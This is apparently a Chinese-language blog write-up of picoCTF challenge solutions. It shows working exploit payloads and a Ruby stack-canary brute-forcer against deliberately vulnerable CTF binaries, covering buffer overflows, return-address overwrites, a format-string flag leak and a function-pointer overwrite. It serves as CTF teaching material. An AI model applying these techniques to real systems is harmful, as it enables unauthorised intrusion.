<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">adminFormHash</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">2196812e91c29df34f5e217cfd639881</span><span class="dl">"</span><span class="p">;</span>
<span class="o">&gt;</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">hiddenAdminForm</span><span class="dl">'</span><span class="p">).</span><span class="nx">submit</span><span class="p">();</span>
</code></pre></div></div>

<h3 id="roboto-scans">Roboto Scans</h3>
<p>题目的名字非常有提示功能, 就是有很多的网站, 
为了不想被像谷歌那样的爬虫爬取信息, 就会在网站根地址里面放一个<code class="language-plaintext highlighter-rouge">robots.txt</code>, 
大概就像是贪官污吏在上头巡抚来检查的时候, 悄咪咪塞了一张金条, 
底下附上了一张条子: 啊, 巡抚大人, 生活不易, 请放我一马, 
然后不要检查下面的这个, 这个, 还有那个文档和目录… 
于是谷歌搜索引擎的爬虫就会跳过那些地址. (我记得淘宝就有类似的东西, 大概吧)</p>

<p>那么访问之http://saturn.picoctf.net:64710/robots.txt
得到:</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User-agent *
Disallow: /cgi-bin/
Think you have seen your flag or want to keep looking.

ZmxhZzEudHh0;anMvbXlmaW
anMvbXlmaWxlLnR4dA==
svssshjweuiwl;oiho.bsvdaslejg
Disallow: /wp-admin/
</code></pre></div></div>

<p>然后解码里面像是base64的东西, 最后得到:</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>flag1.txt;js/myfi
js/myfile.txt
???
</code></pre></div></div>

<p>然后依次去试试看, 最终在<code class="language-plaintext highlighter-rouge">js/myfile.txt</code>里面看到flag.</p>

<h3 id="secret">Secret</h3>
<p>用的是<code class="language-plaintext highlighter-rouge">dirsearch</code>来搜索, 结果找到了一个
http://saturn.picoctf.net:49917/secret/index.html
看起来挺有用但是好像啥也没有用的东西.</p>

<p>然后还有一个
http://saturn.picoctf.net:49917/secret/assets/</p>

<p>但是继续往下好像没有什么东西</p>

<p><code class="language-plaintext highlighter-rouge">dirsearch</code>不行了, 但是我在最开始的界面里面有一个<code class="language-plaintext highlighter-rouge">hidden</code>的提示, 
所以我又行了: 
http://saturn.picoctf.net:49917/secret/hidden/</p>

<p>就是新的问题, 留给新的一天来解决吧.</p>

<p>破案了, 没必要了, 这个该死的家伙, 一路在嘲讽.</p>

<p>在<code class="language-plaintext highlighter-rouge">hidden</code>里面的代码里面看到了一个: 
<code class="language-plaintext highlighter-rouge">&lt;input type="hidden" name="db" value="superhidden/xdfgwd.html" /&gt;</code></p>

<p>然后最后得到了: 
http://saturn.picoctf.net:49917/secret/hidden/superhidden/</p>

<p>代码里面才有flag, 因为flag是和背景色一样的. 
picoCTF{succ3ss_@h3n1c@10n_790d2615}</p>

<h3 id="注">注</h3>
<p>note和Live Art我认为应该是XSS和跨站脚本攻击之类的, 但是因为不太熟, 
所以没有做出来.</p>

<h2 id="basic-file-exploit">basic file exploit</h2>
<p>得到是程序的 C 的源码.</p>

<p>(我是傻叉, 还以为这个问题是一个什么很难的问题, 
以为是要利用什么堆溢出的攻击方法, 没想到, 没想到. 
对于堆溢出, 我可是一点也不会啊… )</p>

<p>观察程序, 发现在开头部分有一个读取flag的操作. 
然后仔细观察, 发现这个flag只在一个地方被使用了, 
就是第144行:</p>

<pre><code class="language-C">  if ((entry_number = strtol(entry, NULL, 10)) == 0) {
    puts(flag);
    fseek(stdin, 0, SEEK_END);
    exit(0);
  }
</code></pre>

<p>嗯, 所以只要让这个if条件成立就好, 那么就要让entry_number=0, 
然后就可以了. 运行程序, 一开始直接去读的话发现无法读取程序, 
因为没有写入任何的东西, 所以随便写一个东西, 然后再去读取程序:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> nc saturn.picoctf.net 49700
Hi, welcome to my <span class="nb">echo </span>chamber!
Type <span class="s1">'1'</span> to enter a phrase into our database
Type <span class="s1">'2'</span> to <span class="nb">echo </span>a phrase <span class="k">in </span>our database
Type <span class="s1">'3'</span> to <span class="nb">exit </span>the program
2
2
No data yet
1
1
Please enter your data:
anything
anything
Please enter the length of your data:
6
6
Your entry number is: 1
Write successful, would you like to <span class="k">do </span>anything <span class="k">else</span>?
2
2
Please enter the entry number of your data:
0
0
picoCTF<span class="o">{</span>M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_9F68795F<span class="o">}</span>
</code></pre></div></div>

<p>解决问题.</p>

<h3 id="buffer-overflow-0--1--2--3">buffer overflow 0 &amp; 1 &amp; 2 &amp; 3</h3>
<p>栈溢出的问题, 其实不是很难.</p>

<h4 id="buffer-overflow-0">buffer overflow 0</h4>
<p>看题目名字就知道要溢出, 看代码里面有一个<code class="language-plaintext highlighter-rouge">sigsegv_handler</code>函数, 
还有一个<code class="language-plaintext highlighter-rouge">strcpy</code>函数, 可见应该是<code class="language-plaintext highlighter-rouge">strcpy</code>函数在拷贝字符串的时候没有
限制, 导致拷贝的东西溢出了, 这样就会触发<code class="language-plaintext highlighter-rouge">SIGSEGV</code>信号, 
导致调用<code class="language-plaintext highlighter-rouge">sigsegv_handler</code>函数.</p>

<p>(注: 关于信号的话, 可以参考<code class="language-plaintext highlighter-rouge">man signal</code>)</p>

<p>解决问题:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> nc saturn.picoctf.net 51110
Input: <span class="nb">test
</span>The program will <span class="nb">exit </span>now
<span class="o">&gt;</span> ruby <span class="nt">-e</span> <span class="s1">' print "Lucky_Magic" * 10 '</span> | nc saturn.picoctf.net 51110
Input: picoCTF<span class="o">{</span>ov3rfl0ws_ar3nt_that_bad_8ba275ff<span class="o">}</span>
</code></pre></div></div>

<p>就这样.</p>

<h4 id="buffer-overflow-1">buffer overflow 1</h4>
<p>只要修改最后的ret地址就可以实现任意地址跳转了, 
好的, 用gdb查看跳转的位置:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> gdb vuln
gdb-peda<span class="nv">$ </span>r <span class="o">&lt;&lt;&lt;</span> <span class="si">$(</span> ruby <span class="nt">-e</span> <span class="s1">' t = "z"; 100.times do print(t.succ!) end '</span> <span class="si">)</span>
...
Stopped reason: SIGSEGV
0x78617761 <span class="k">in</span> ?? <span class="o">()</span>
</code></pre></div></div>

<p>然后计算偏移量:</p>

<div class="language-irb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">3.0.0 :001 &gt; t = "z"; 100.times do print(t.succ!) end
aaabacadaeafagahaiajakalamanaoapaqarasatauavawaxayazbabbbcbdbebfbgbhbibjbkblbmbnbobpbqbrbsbtbubvbwbxbybzcacbcccdcecfcgchcicjckclcmcncocpcqcrcsctcucvcwcxcyczdadbdcdddedfdgdhdidjdkdldmdndodpdqdrdsdtdudv =&gt; 100 
3.0.0 :002 &gt; s = "aaabacadaeafagahaiajakalamanaoapaqarasatauavawaxayazbabbbcbdbe
bfbgbhbibjbkblbmbnbobpbqbrbsbtbubvbwbxbybzcacbcccdcecfcgchcicjckclcmcncocpcqcrcs
ctcucvcwcxcyczdadbdcdddedfdgdhdidjdkdldmdndodpdqdrdsdtdudv"
 =&gt; "aaabacadaeafagahaiajakalamanaoapaqarasatauavawaxayazbabbbcbdbebfbgbhb... 
3.0.0 :003 &gt; addr = "\x78\x61\x77\x61"
 =&gt; "xawa" 
3.0.0 :004 &gt; s.index addr.reverse
 =&gt; 44
</span></code></pre></div></div>

<p>然后用ghidra找到<code class="language-plaintext highlighter-rouge">win</code>函数的地址: <code class="language-plaintext highlighter-rouge">080491f6</code>, 
然后运行:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> ruby <span class="nt">-e</span> <span class="s1">'print "a" * 44 + "\x00\x00\x00\x00\x08\x04\x91\xf6".reverse'</span> | nc saturn.picoctf.net 62004
Please enter your string: 
Okay, <span class="nb">time </span>to <span class="k">return</span>... Fingers Crossed... Jumping to 0x80491f6
picoCTF<span class="o">{</span>addr3ss3s_ar3_3asy_c76b273b<span class="o">}</span>
</code></pre></div></div>

<p>结束.</p>

<p>为了防止你不太懂, (假如是高手的话, 请跳过吧)
之所以会有栈溢出这样的东西, 是因为计算机里面, 为了储存局部变量, 
就需要通过开辟一个临时的空间来放. (这个可以去我的
<a href="/ruby/ri-lang">Computer Toys</a>, 或者之前的
<a href="/ctf/stack/">Stack</a>看看, 
并且我打算最近更新一下Stack, 因为有了新的理解了. )</p>

<p>这个临时空间是这样的一个概念, 假如我要放一个长度为10的数组, 
那么我就要开辟一个大小为10的空间, 也不用太多, 防止浪费. 
然后在写数据的时候, 就按照位置来写入数据. 但是这个时候, 
可能就会出现一个问题: 如果我往数组的第11个位置写入了数据会怎么办? 
谁也不知道会怎么办, 毕竟(我觉得)一开始人们并没有想过这样的问题, 
设计者绝对想不到自己的使用者都是这样的奇怪的人. 
所以当你写的时候, 就会写到原本开辟的空间外面, 比如说, 
写到了函数的返回地址里面.</p>

<p>关于这个, 简单理解就像是, 函数调用就好像是刘禅(小名阿斗, 
比如说是计算机的eip寄存器, 
就是指向当前CPU运行的命令的地址的一个寄存器)
被捉到了一个新的地方(eip跳转到了函数的区域), 本来心里面还有蜀国
(也就是原来调用函数的主程序的地址, 被储存在栈里面), 
但是你的play太奇怪了, 让他心里(也就是计算机的栈里面储存的返回地址)
的某些东西被被改变了, 导致他乐不思蜀(返回地址被修改了), 回不去了, 
最后就到了奇怪的地方, 可能会被利用了. (比如说让计算机返回一个特定的地址, 
然后执行特定的函数). 上面的过程就是这么样的一个过程.</p>

<h4 id="buffer-overflow-2">buffer overflow 2</h4>
<p>这次除了要修改函数的返回地址, 还要修改函数的传入参数, 
坏了, 我不知道传入参数在哪里写啊, 所以先用土法来炼金.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]<span class="o">=</span>1c57f0cbd109ed51024baf11930a5364186c28df, <span class="k">for </span>GNU/Linux 3.2.0, not stripped
<span class="o">&gt;</span> <span class="nb">chmod</span> +x vuln
<span class="o">&gt;</span> gdb ./vuln
gdb-peda<span class="nv">$ </span>r <span class="o">&lt;&lt;&lt;</span> <span class="si">$(</span> ruby <span class="nt">-e</span> <span class="s1">' t = "z"; 200.times do print(t.succ!) end '</span> <span class="si">)</span>
Stopped reason: SIGSEGV
0x66636563 <span class="k">in</span> ?? <span class="o">()</span>
</code></pre></div></div>

<div class="language-irb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">3.0.0 :001 &gt; t = "z"; 200.times do print(t.succ!) end
aaabacadaeafagahaiajakalamanaoapaqarasatauavawaxayazbabbbcbdbebfbgbhbibjbkblbmbnbobpbqbrbsbtbubvbwbxbybzcacbcccdcecfcgchcicjckclcmcncocpcqcrcsctcucvcwcxcyczdadbdcdddedfdgdhdidjdkdldmdndodpdqdrdsdtdudvdwdxdydzeaebecedeeefegeheiejekelemeneoepeqereseteuevewexeyezfafbfcfdfefffgfhfifjfkflfmfnfofpfqfrfsftfufvfwfxfyfzgagbgcgdgegfggghgigjgkglgmgngogpgqgrgsgtgugvgwgxgygzhahbhchdhehfhghhhihjhkhlhmhnhohphqhr =&gt; 200 
3.0.0 :002 &gt; s = "aaabacadaeafagahaiajakalamanaoapaqarasatauavawaxayazbabbbcbdbe
bfbgbhbibjbkblbmbnbobpbqbrbsbtbubvbwbxbybzcacbcccdcecfcgchcicjckclcmcncocpcqcrcs
ctcucvcwcxcyczdadbdcdddedfdgdhdidjdkdldmdndodpdqdrdsdtdudvdwdxdydzeaebecedeeefeg
eheiejekelemeneoepeqereseteuevewexeyezfafbfcfdfefffgfhfifjfkflfmfnfofpfqfrfsftfu
fvfwfxfyfzgagbgcgdgegfggghgigjgkglgmgngogpgqgrgsgtgugvgwgxgygzhahbhchdhehfhghhhi
hjhkhlhmhnhohphqhr"
 =&gt; "aaabacadaeafagahaiajakalamanaoapaqarasatauavawaxayazbabbbcbdbebfbgbhb... 
3.0.0 :003 &gt; addr = "\x66\x63\x65\x63"
 =&gt; "fcec" 
3.0.0 :004 &gt; s.index addr.reverse
 =&gt; 112
</span></code></pre></div></div>

<p>一点点解释: 观察代码, 发现<code class="language-plaintext highlighter-rouge">win</code>函数里面, 比较的代码是:</p>
<pre><code class="language-asm">   0x0804930c &lt;+118&gt;:	cmp    DWORD PTR [ebp+0x8],0xcafef00d
   0x08049313 &lt;+125&gt;:	jne    0x804932f &lt;win+153&gt;
   0x08049315 &lt;+127&gt;:	cmp    DWORD PTR [ebp+0xc],0xf00df00d
   0x0804931c &lt;+134&gt;:	jne    0x8049332 &lt;win+156&gt;
</code></pre>

<p>于是只要往所谓的<code class="language-plaintext highlighter-rouge">ebp+0x8</code>和<code class="language-plaintext highlighter-rouge">ebp+0xc</code>里面写入想要的数据就好了. 
为了找到写的数据的位置, 也可以用更写一堆乱七八糟的东西, 
然后运行, 在比较的代码上面设断点, 最后看看数据就知道写了啥了.</p>

<p>然后就是无聊的<code class="language-plaintext highlighter-rouge">playload</code>的时间了:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ruby <span class="nt">-e</span> <span class="s1">' print "a" * 112 + "\x00\x00\x00\x00\x08\x04\x92\x96".reverse + "\xCA\xFE\xF0\x0D".reverse + "\xF0\x0D\xF0\x0D".reverse '</span> | nc saturn.picoctf.net 51137
</code></pre></div></div>

<p>再说一嘴: 这里能够写入参数的原因是因为这些参数是通过栈来传递的, 
也就是说, <code class="language-plaintext highlighter-rouge">func(arg)</code>就像是这样:</p>

<pre><code class="language-asm">PUSH arg
CALL func
</code></pre>

<p>来调用的.</p>

<h4 id="buffer-overflow-3">buffer overflow 3</h4>
<p>题目说自己有一个栈保护检查, 也就是CANARY检查, 
实际上并没有真正的检查, 只是一种类似的思想而已.</p>

<p>这个思想就是, 既然你想要通过写爆栈来干坏事, 
那么程序就在每个栈末尾留一个保护字串, 假如保护字串被修改了, 
那么拒绝跳转, 并告诉你干坏事是不对的. 就像是以前很多的电子产品, 
有一个撕毁不保修的封条. 假如你撕坏了保修封条, 那么恭喜, 
维修商就不会为你维修啦.</p>

<p>但是我们可以伪造一个和这个封条一毛一样的假封条, 
在拆开之后(栈溢出的时候), 再把假封条贴回去. 具体的做法就是:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">require</span> <span class="s2">"socket"</span>
<span class="nb">require</span> <span class="s2">"colorize"</span>

<span class="no">URL</span> <span class="o">=</span> <span class="s2">"saturn.picoctf.net"</span>
<span class="no">PORT</span> <span class="o">=</span> <span class="mi">49518</span>

<span class="no">CHARSET</span> <span class="o">=</span> <span class="p">(</span><span class="s2">"a"</span><span class="o">..</span><span class="s2">"z"</span><span class="p">).</span><span class="nf">to_a</span> <span class="o">+</span> <span class="p">(</span><span class="s2">"0"</span><span class="o">..</span><span class="s2">"9"</span><span class="p">).</span><span class="nf">to_a</span> <span class="o">+</span> <span class="p">(</span><span class="s2">"A"</span><span class="o">..</span><span class="s2">"Z"</span><span class="p">).</span><span class="nf">to_a</span>
<span class="no">LEN</span> <span class="o">=</span> <span class="no">CHARSET</span><span class="p">.</span><span class="nf">length</span>

<span class="c1"># 测试函数</span>
<span class="k">def</span> <span class="nf">connect</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
  <span class="c1"># TCP 连接到服务器</span>
  <span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="no">URL</span><span class="p">,</span> <span class="no">PORT</span><span class="p">)</span>
  <span class="n">s</span><span class="p">.</span><span class="nf">puts</span> <span class="n">message</span>
  <span class="n">res</span> <span class="o">=</span> <span class="s2">""</span>
  <span class="k">while</span> <span class="p">(</span><span class="n">get</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">gets</span><span class="p">)</span>
    <span class="n">res</span> <span class="o">&lt;&lt;</span> <span class="n">get</span>
  <span class="k">end</span>
  <span class="c1"># 返回服务器的输出</span>
  <span class="k">return</span> <span class="n">res</span>
<span class="k">end</span>

<span class="c1"># 按位爆破</span>
<span class="n">canary</span> <span class="o">=</span> <span class="s2">""</span>
<span class="c1"># 题目里面说总长度是4</span>
<span class="mi">4</span><span class="p">.</span><span class="nf">times</span> <span class="k">do</span> <span class="o">|</span><span class="n">i</span><span class="o">|</span>
  <span class="c1"># 每一个字符进行一个爆破</span>
  <span class="no">LEN</span><span class="p">.</span><span class="nf">times</span> <span class="k">do</span> <span class="o">|</span><span class="n">j</span><span class="o">|</span>
    <span class="c1"># puts (temp_canary = canary + CHARSET[j])</span>
    <span class="n">temp_canary</span> <span class="o">=</span> <span class="n">canary</span> <span class="o">+</span> <span class="no">CHARSET</span><span class="p">[</span><span class="n">j</span><span class="p">]</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="s2">"</span><span class="si">#{</span><span class="mi">64</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="si">}</span><span class="se">\n</span><span class="s2">"</span> <span class="o">+</span> <span class="s2">"a"</span> <span class="o">*</span> <span class="mi">64</span> <span class="o">+</span> <span class="n">temp_canary</span><span class="p">)</span>
    <span class="c1"># 成功的样子</span>
    <span class="k">if</span> <span class="n">res</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/Flag/</span><span class="p">)</span>
      <span class="n">canary</span> <span class="o">=</span> <span class="n">temp_canary</span>
      <span class="nb">puts</span> <span class="n">canary</span><span class="p">.</span><span class="nf">colorize</span><span class="p">(</span><span class="ss">:green</span><span class="p">)</span>
      <span class="k">break</span>
    <span class="k">end</span>
  <span class="k">end</span>
<span class="k">end</span>

<span class="nb">puts</span> <span class="n">connect</span><span class="p">(</span><span class="s2">"100</span><span class="se">\n</span><span class="s2">"</span><span class="o">+</span><span class="s2">"a"</span> <span class="o">*</span> <span class="mi">64</span> <span class="o">+</span> <span class="n">canary</span> <span class="o">+</span> <span class="s2">"a"</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="s2">"</span><span class="se">\x00\x00\x00\x00\x08\x04\x93\x36</span><span class="s2">"</span><span class="p">.</span><span class="nf">reverse</span><span class="p">)</span>

<span class="c1"># =&gt; How Many Bytes will You Write Into the Buffer?</span>
<span class="c1"># &gt; Input&gt; Ok... Now Where's the Flag?</span>
<span class="c1"># picoCTF{Stat1C_c4n4r13s_4R3_b4D_9602b3a1}</span>
</code></pre></div></div>

<h3 id="cve-xxxx-xxxx">CVE-XXXX-XXXX</h3>
<p>一道历史题…</p>

<p><a href="https://blog.qualys.com/vulnerabilities-threat-research/2021/07/07/microsoft-windows-print-spooler-rce-vulnerability-printnightmare-cve-2021-34527-automatically-discover-prioritize-and-remediate-using-qualys-vmdr">相关历史</a></p>

<p>有点意思, 没想到老是背锅的Windows在这里都不放过对它的鞭尸. 
具体的我就不了解了. 这道题就是一个联系搜索引擎的题目. 
仅此而已.</p>

<blockquote>
  <p>The CVE we’re looking for is the first recorded 
remote code execution (RCE) vulnerability in 2021 
in the Windows Print Spooler Service, which is 
available across desktop and server versions of 
Windows operating systems. The service is used to 
manage printers and print servers.</p>
</blockquote>

<h3 id="rps">RPS</h3>
<p>题目是一个剪刀石头布的比赛, 正常应该是通过时间和伪随机数来攻击, 
得到其输出的规律. 但是我发现:</p>

<p>发现这个比较石头剪刀布的胜利与否的函数竟然是一个
<code class="language-plaintext highlighter-rouge">strstr</code>函数, 也就是说, 只要有匹配的字符串, 那么就会胜利.</p>

<p>于是构造这样的出拳: <code class="language-plaintext highlighter-rouge">rockpaperscissors</code>, 这样呢, 会怎么样?</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">6</span><span class="p">.</span><span class="nf">times</span> <span class="k">do</span>
  <span class="nb">puts</span> <span class="s2">"1"</span><span class="p">,</span> <span class="s2">"rockpaperscissors"</span>
<span class="k">end</span>
</code></pre></div></div>

<p>呃, 完胜啊. (小孩子才做选择, 我全都上. )</p>

<p><code class="language-plaintext highlighter-rouge">picoCTF{50M3_3X7R3M3_1UCK_C85AF58A}</code></p>

<h3 id="x-sixty-what">x-sixty-what</h3>
<p>这个题目和之前的问题很像.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> gdb vuln
gdb-peda<span class="nv">$ </span>i functions 
0x00000000004012b2  vuln
gdb-peda<span class="nv">$ </span>r <span class="o">&lt;&lt;&lt;</span> <span class="si">$(</span> ruby <span class="nt">-e</span> <span class="s1">' t = "z"; 100.times do print(t.succ!) end '</span> <span class="si">)</span>
Stopped reason: SIGSEGV
0x6e626d626c626b62 <span class="k">in</span> ?? <span class="o">()</span>
</code></pre></div></div>

<div class="language-irb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">3.0.0 :002 &gt; s = "aaabacadaeafagahaiajakalamanaoapaqarasatauavawaxayazbabbbcbdbe
bfbgbhbibjbkblbmbnbobpbqbrbsbtbubvbwbxbybzcacbcccdcecfcgchcicjckclcmcncocpcqcrcs
ctcucvcwcxcyczdadbdcdddedfdgdhdidjdkdldmdndodpdqdrdsdtdudv"
 =&gt; "aaabacadaeafagahaiajakalamanaoapaqarasatauavawaxayazbabbbcbdbebfbgbhb... 
3.0.0 :003 &gt; addr = "\x6e\x62\x6d\x62\x6c\x62\x6b\x62"
 =&gt; "nbmblbkb" 
3.0.0 :004 &gt; s.index addr.reverse
 =&gt; 72
</span></code></pre></div></div>

<p>发现函数地址就是<code class="language-plaintext highlighter-rouge">0x4012ba</code>, 然后试试看能不能跳转运行.</p>

<p>奇怪, 在本地可以运行, 但是在远程没有结果?</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> ruby <span class="nt">-e</span> <span class="s1">' print "a" * 72 + "\x00\x00\x00\x00\x00\x40\x12\x36".reverse '</span> | ./vuln 
Welcome to 64-bit. Give me a string that gets you the flag: 
NeSE<span class="o">{</span>fake_flag<span class="o">}</span>
zsh: <span class="k">done                              </span>ruby <span class="nt">-e</span> <span class="s1">' print "a" * 72 + "\x00\x00\x00\x00\x00\x40\x12\x36".reverse '</span> | 
zsh: segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>  ./vuln
<span class="o">&gt;</span> ruby <span class="nt">-e</span> <span class="s1">' print "a" * 72 + "\x00\x00\x00\x00\x00\x40\x12\x36".reverse '</span> | nc saturn.picoctf.net 53636
Welcome to 64-bit. Give me a string that gets you the flag:
</code></pre></div></div>

<p>看来还要一些操作才行. 
我多跳转几次, 让它不得不来听我的话:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">puts</span> <span class="s2">"a"</span> <span class="o">*</span> <span class="mi">72</span> <span class="o">+</span> <span class="s2">"</span><span class="se">\x00\x00\x00\x00\x00\x40\x12\xd2</span><span class="s2">"</span><span class="p">.</span><span class="nf">reverse</span>
<span class="nb">puts</span> <span class="s2">"a"</span> <span class="o">*</span> <span class="mi">72</span> <span class="o">+</span> <span class="s2">"</span><span class="se">\x00\x00\x00\x00\x00\x40\x12\x36</span><span class="s2">"</span><span class="p">.</span><span class="nf">reverse</span>
</code></pre></div></div>

<p>(以前见过类似的问题, 因为程序用了特定的函数, 会在跳转的时候, 
试图产生错误, 但是跳两次之后就会让程序放弃这个错误)</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> ruby test.rb | nc saturn.picoctf.net 53636
Welcome to 64-bit. Give me a string that gets you the flag: 
Welcome to 64-bit. Give me a string that gets you the flag: 
picoCTF<span class="o">{</span>b1663r_15_b3773r_964d9987<span class="o">}</span>
</code></pre></div></div>

<h3 id="flag-leak">flag leak</h3>
<p>观察代码, 发现漏洞的:</p>

<pre><code class="language-C">void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one &gt;&gt; ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}
</code></pre>

<p>这里面有一个不安全的东西: (确切来说是一个不安全的组合)
因为<code class="language-plaintext highlighter-rouge">scanf("%127s", story);</code>读取了用户的输入, 
然后<code class="language-plaintext highlighter-rouge">printf(story);</code>直接将用户的输入不仅保护地输出了, 
于是就有格式化字符串漏洞. 所以试试看.</p>

<p>所谓的格式化字符串攻击可以利用类似的方法来进行攻击, 
不过这样的漏洞好像在编译的时候都会提醒的… 
但是在粗心的程序设计里面可能就会留下这样的漏洞. 
为了避免这样的漏洞, 可以<code class="language-plaintext highlighter-rouge">printf("%s", s);</code>来防止漏洞.</p>

<p>多试试组合就好了:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> ruby <span class="nt">-e</span> <span class="s1">'print "%p" * 100 '</span> | nc saturn.picoctf.net 50946
Tell me a story and <span class="k">then </span>I<span class="s1">'ll tell you one &gt;&gt; Here'</span>s a story - 
0xffd13f200xffd13f400x80493460x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x2570250x6f6369700x7b4654430x6b34334c0x5f676e310x67346c460x6666305f0x3474535f0x635f6b630x343965320x7d6433650xfbad20000xc905a800<span class="o">(</span>nil<span class="o">)</span>0xf7fe69900x804c0000x8049410<span class="o">(</span>nil<span class="o">)</span>0x804c0000xffd140080x80494180x20xffd140b40xffd140c0<span class="o">(</span>nil<span class="o">)</span>0xffd14020<span class="o">(</span>nil<span class="o">)(</span>nil<span class="o">)</span>0xf7ddcee5
</code></pre></div></div>

<div class="language-irb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">&gt; a = "0xffd13f200xffd13f400x80493460x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x2570250x6f6369700x7b4654430x6b34334c0x5f676e310x673
46c460x6666305f0x3474535f0x635f6b630x343965320x7d6433650xfbad20000xc905a800(nil)0xf7fe69900x804c0000x8049410(nil)0x804c0000xffd140080x80494180x20xffd140b40xffd140c0(nil)0xffd14020(nil)(nil)0xf7ddcee5".split("0x")
&gt; def hexstr2str(hexstr)
&gt;   str = ""
&gt;   num = hexstr.to_i(16)
&gt;   while num &gt; 0
&gt;     str &lt;&lt; (num &amp; 0xff).chr
&gt;     num /= 0x100
&gt;   end
&gt;   str
&gt; end
&gt; a.each do |hexstr|
&gt;   p hexstr2str(hexstr)
&gt; end
</span><span class="c">...
</span><span class="go">"%p%"
"pico"
"CTF{"
"L34k"
"1ng_"
"Fl4g"
"_0ff"
"_St4"
"ck_c"
"2e94"
"e3d}"
"\x00 \xAD\xFB"
</span><span class="c">...
</span></code></pre></div></div>

<p>这样就看见了flag啦.</p>

<p>注: 因为<code class="language-plaintext highlighter-rouge">printf</code>函数的格式化输出的特性会将它后面的值(也就是传入的参数), 
给格式化输出, 所以就可以利用这个特性糊弄计算机, 让它以为有传入的参数, 
于是就导致了计算机去读取栈上的其他信息, 然后就导致了读到了flag. 
并且可以利用类似的方法甚至可以在栈上面写任意的数据… 但是我不是很会. 
(以后学… )</p>

<h3 id="function-overwriting">function overwriting</h3>
<p>查看程序里面的东西, 发现里面的函数调用是通过一个全局变量来调用的. 
然后程序里面也有一个类似于全局变量的数组, 而这个数组有一个写的方法, 
而写的时候没有什么检测和保护措施. 所以想法就是把<code class="language-plaintext highlighter-rouge">hard_checker</code>换成
<code class="language-plaintext highlighter-rouge">easy_checker</code>, 因为前者是一个比较坑的函数, 是没法通过的. 
而后者就是个好捏的软柿子了.</p>

<p>所以设置偏移量, 然后写入数据, 最后就能够让执行函数的时候把它给解决了.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> ruby <span class="nt">-e</span> <span class="s1">' puts "a"*13+"L", "-16 -314" '</span> | nc saturn.picoctf.net 50134
Tell me a story and <span class="k">then </span>I<span class="s1">'ll tell you if you'</span>re a 1337 <span class="o">&gt;&gt;</span> On a totally unrelated note, give me two numbers. Keep the first one less than 10.
You<span class="s1">'re 1337. Here'</span>s the flag.
picoCTF<span class="o">{</span>0v3rwrit1ng_P01nt3rs_698c2a26<span class="o">}</span>
</code></pre></div></div>

<h2 id="cryptography">Cryptography</h2>
<p>说实话, 我对密码学是一窍不通, 现在的基本只能解决古典密码, 
但是对于现代的那些密码, 因为数学不过关, 导致基本不会. 
以后决定开始了解这些东西了…</p>

<h3 id="basic-mod-1--2">basic mod 1 &amp; 2</h3>
<p>mod1的题目解释已经把要做的事情全部做完了:</p>

<blockquote>
  <p>We found this weird message being passed 
around on the servers, we think we have
a working decrpytion scheme.</p>

  <p>Download the message here.
Take each number mod 37 and map it to the
following character set: 0-25 is the
